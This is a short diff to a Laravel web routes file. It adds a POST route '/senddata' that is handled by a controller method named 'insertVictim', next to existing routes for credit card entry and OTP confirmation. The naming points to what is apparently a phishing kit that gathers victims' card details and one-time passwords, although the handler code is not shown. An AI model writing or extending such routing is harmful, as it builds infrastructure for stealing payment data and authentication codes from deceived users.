@@ -26,6 +26,7 @@ Route::get('/register2', [formController::class, 'oldform'])->name('register2');
 Route::get('/creditcard',[formController::class,'card'])->name('creditcard');
 Route::get('/confirm_otp',[formController::class,'otp'])->name('confirm_otp');
 Route::get('/info',[formController::class,'info'])->name('checkinfo');
+Route::post('/senddata', [formController::class, 'insertVictim'])->name('insertvictim');
 
 
 Route::get('/getotp', [otpController::class, 'recieveOtp'])->name('getotp');
